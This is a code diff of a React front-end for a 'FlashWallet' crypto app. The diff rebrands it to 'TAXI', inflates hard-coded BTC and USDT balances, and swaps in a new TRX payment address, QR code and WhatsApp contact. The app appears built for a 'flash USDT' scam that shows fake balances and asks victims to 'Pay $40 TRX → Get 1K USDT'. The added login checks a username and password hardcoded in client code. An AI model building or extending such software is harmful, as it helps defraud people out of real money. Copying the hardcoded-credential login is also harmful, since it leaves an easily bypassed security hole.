@@ -1,12 +1,17 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { QRCodeCanvas } from "qrcode.react";
 
 function App() {
   const [tab, setTab] = useState("dashboard");
+  const [loggedIn, setLoggedIn] = useState(
+  localStorage.getItem("loggedIn") === "true"
+);
+const [username, setUsername] = useState("");
+const [password, setPassword] = useState("");
 
   const [assets, setAssets] = useState([
-    { name: "Bitcoin", symbol: "BTC", balance: 20 },
-    { name: "USDT", symbol: "USDT", balance: 50000000 }
+    { name: "Bitcoin", symbol: "BTC", balance: 200 },
+    { name: "USDT", symbol: "USDT", balance: 500000000 }
   ]);
 
   const [transactions, setTransactions] = useState([]);
@@ -18,7 +23,20 @@ function App() {
   const [email, setEmail] = useState("");
 
   const [toast, setToast] = useState(null);
+const handleLogin = () => {
+  if (username === "Taxi" && password === "a7774720") {
+    localStorage.setItem("loggedIn", "true");
+    setLoggedIn(true);
+    notify("Login successful");
+  } else {
+    notify("Invalid username or password");
+  }
+};
 
+const handleLogout = () => {
+  localStorage.removeItem("loggedIn");
+  setLoggedIn(false);
+};
   // 🔔 SOUND + NOTIFY
   const playSound = () => {
     const audio = new Audio(
@@ -138,21 +156,78 @@ function App() {
 
   const totalBalance =
     `${assets[0].balance} BTC + ${assets[1].balance} USDT`;
+if (!loggedIn) {
+  return (
+    <div
+      style={{
+        minHeight: "100vh",
+        background: "#111",
+        display: "flex",
+        justifyContent: "center",
+        alignItems: "center",
+        color: "#fff"
+      }}
+    >
+      <div
+        style={{
+          background: "#222",
+          padding: 30,
+          borderRadius: 10,
+          width: 350
+        }}
+      >
+<h2>🔐 TAXI FlashWallet Login</h2>
+        <input
+          type="text"
+          placeholder="Username"
+          value={username}
+          onChange={(e) => setUsername(e.target.value)}
+          style={{
+            width: "100%",
+            padding: 10,
+            marginBottom: 10
+          }}
+        />
 
+        <input
+          type="password"
+          placeholder="Password"
+          value={password}
+          onChange={(e) => setPassword(e.target.value)}
+          style={{
+            width: "100%",
+            padding: 10,
+            marginBottom: 10
+          }}
+        />
+
+        <button
+          onClick={handleLogin}
+          style={{
+            width: "100%",
+            padding: 10
+          }}
+        >
+          Login
+        </button>
+      </div>
+    </div>
+  );
+}
   return (
     <div style={styles.container}>
 
       {toast && <div style={styles.toast}>🔔 {toast}</div>}
 
-      <h1 style={styles.header}>MarkTech FlashWallet</h1>
-
+<h1 style={styles.header}>TAXI FlashWallet</h1>
       {/* NAV */}
       <div style={styles.nav}>
-        <button onClick={() => setTab("dashboard")}>Dashboard</button>
-        <button onClick={() => setTab("assets")}>Assets</button>
-        <button onClick={() => setTab("tx")}>Transactions</button>
-        <button onClick={() => setTab("send")}>Send</button>
-      </div>
+  <button onClick={() => setTab("dashboard")}>Dashboard</button>
+  <button onClick={() => setTab("assets")}>Assets</button>
+  <button onClick={() => setTab("tx")}>Transactions</button>
+  <button onClick={() => setTab("send")}>Send</button>
+  <button onClick={handleLogout}>Logout</button>
+</div>
 
       {/* DASHBOARD */}
       {tab === "dashboard" && (
@@ -189,7 +264,7 @@ function App() {
               <p>Pay $40 TRX → Get 1K USDT (Demo)</p>
               <p style={{ fontWeight: "bold" }}>
                 RECIVED 1K ONLY AFTER PAYMENT CONFIRMATION
-                TQFx2LdL7XGfJNnbdCGZrixt5c8J4zKEdD
+                TWwJF917JnqwYBLQrKfMerzMjW5tFLZk14
               </p>
             </div>
           </div>
@@ -198,7 +273,7 @@ function App() {
 
             <div style={styles.qr}>
               <h3>📷 TRX Payment QR</h3>
-              <QRCodeCanvas value="TQFx2LdL7XGfJNnbdCGZrixt5c8J4zKEdD" />
+              <QRCodeCanvas value="TWwJF917JnqwYBLQrKfMerzMjW5tFLZk14" />
             </div>
 
             <div style={styles.exchange}>
@@ -208,7 +283,7 @@ function App() {
               <div style={{ marginTop: 10 }}>
                 <h4>📞 Support</h4>
                 <a
-                  href="https://wa.me/+2347070591041"
+                  href="https://wa.me/+81 80-9006-6707"
                   target="_blank"
                   style={{ color: "#00ff88" }}
                 >
@@ -248,37 +323,32 @@ function App() {
         <div style={styles.card}>
           <h2>Send Crypto</h2>
 
-          <select onChange={(e) => setCoin(e.target.value)}>
-            <option>BTC</option>
-            <option>USDT</option>
-          </select>
-
           <select onChange={(e) => setNetwork(e.target.value)}>
-            <option>TRC20</option>
-            <option>BEP20</option>
-            <option>ERC20</option>
-          </select>
+  <option>TRC20</option>
+  <option>BEP20</option>
+  <option>ERC20</option>
+</select>
 
-          <input
-            placeholder="Address"
-            value={address}
-            onChange={(e) => setAddress(e.target.value)}
-          />
+<input
+  placeholder="Address"
+  value={address}
+  onChange={(e) => setAddress(e.target.value)}
+/>
 
-          <input
-            placeholder="Amount"
-            value={amount}
-            onChange={(e) => setAmount(e.target.value)}
-          />
+<input
+  placeholder="Amount"
+  value={amount}
+  onChange={(e) => setAmount(e.target.value)}
+/>
 
-          <input
-            placeholder="Email (optional)"
-            value={email}
-            onChange={(e) => setEmail(e.target.value)}
-          />
+<input
+  placeholder="Email (optional)"
+  value={email}
+  onChange={(e) => setEmail(e.target.value)}
+/>
 
-          <button onClick={handleSend}>Send</button>
-        </div>
+<button onClick={handleSend}>Send</button>
+</div>
       )}
 
     </div>
@@ -286,7 +356,6 @@ function App() {
 }
 
 export default App;
-
 // ================= STYLES =================
 const styles = {
   container: { padding: 20, background: "#111", color: "#fff", minHeight: "100vh" },
